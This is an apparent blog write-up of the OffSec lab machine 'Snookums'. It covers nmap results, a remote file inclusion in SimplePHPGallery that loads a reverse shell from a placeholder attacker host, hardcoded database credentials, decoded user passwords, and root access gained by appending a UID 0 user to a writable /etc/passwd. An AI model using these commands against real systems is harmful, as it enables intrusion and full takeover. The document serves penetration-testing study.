+++
date = '2026-03-31T11:11:14+09:00'
draft = false
title = 'Snookums'
tags = ["openssl", "/etc/passwd", "writable"]
description = "A comprehensive writeup for the OffSec Snookums machine. Learn how to exploit an RFI vulnerability in SimplePHPGallery for an initial foothold, extract database credentials, and achieve root access by exploiting a writable /etc/passwd file."
+++

# port scan

```bash
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
Service Info: Host: SNOOKUMS; OS: Unix
```

# initial foothold

Upon navigating to the web interface, I identified the version of the underlying framework.

![web](/images/snookums/web-1.png)

Researching this specific version revealed that version 0.7 is vulnerable to [RFI vulnerability](https://www.exploit-db.com/exploits/48424). 

Through further testing, I confirmed that this vulnerability persists in version 0.8 as well.

To gain an initial shell, I prepared a PHP reverse shell script on my local attacker machine. I then leveraged the RFI vulnerability by pointing the `img` parameter to my hosted shell: 

`http://<TARGET_IP>/image.php?img=http://<ATTACKER_IP>/revshell.php`

Executing this request triggered the reverse shell, granting me initial access to the victim server as the Apache user.

# Privilege escalation

## apache -> michael

While enumerating the web root directory, I discovered a database configuration file containing hardcoded credentials:

```php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
```

Using these credentials to access the local database, I extracted the users table, which contained several Base64-encoded passwords:

```
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
```

After decoding the strings, I successfully retrieved the cleartext password for the user michael:

`HockSydneyCertify123`

## michael -> root

After switching to michael via SSH, I ran linpeas. 

The results highlighted the `/etc/passwd` file was writable.

I exploited this by appending a new user with root privileges (UID 0) to the passwd file:

```bash
pw=$(openssl passwd Password123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Finally, switch user to r00t with the password.
